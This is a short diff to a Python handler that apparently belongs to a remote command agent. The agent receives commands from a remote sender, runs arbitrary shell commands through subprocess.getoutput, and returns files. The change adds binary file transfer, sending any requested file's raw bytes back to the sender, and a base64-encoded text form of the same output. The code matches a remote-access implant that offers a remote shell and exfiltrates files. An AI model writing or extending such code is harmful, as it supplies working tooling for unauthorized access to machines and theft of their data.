@@ -85,9 +85,25 @@ def handle_message(message: dict):
     arg = message.get("arg", "")
     
     print(f"[*] Command received: {command} {arg}")
-    output = execute_command(command, arg)
     
-    # Send response
+    # Handle copy command specially - send binary file response
+    if command == "copy":
+        import os
+        if os.path.exists(arg):
+            try:
+                with open(arg, "rb") as f:
+                    file_data = f.read()
+                filename = os.path.basename(arg)
+                stack.send(sender, "file_response", filename=filename, file_data=file_data)
+                return
+            except Exception as e:
+                output = f"Error reading file: {e}"
+        else:
+            output = "File not found"
+    else:
+        output = execute_command(command, arg)
+    
+    # Send text response
     stack.send(sender, "response", output=output)
 
 
@@ -106,9 +122,11 @@ def execute_command(command: str, arg: str) -> str:
         elif command == "exec":
             return subprocess.getoutput(arg)
         elif command == "copy":
+            import base64
             if os.path.exists(arg):
-                with open(arg, "r", errors='ignore') as f:
-                    return f"FILE_START:{arg}:{f.read()}"
+                with open(arg, "rb") as f:
+                    content = base64.b64encode(f.read()).decode('ascii')
+                    return f"FILE_START: {arg}\n{content}\nFILE_END"
             else:
                 return "File not found"
         else:
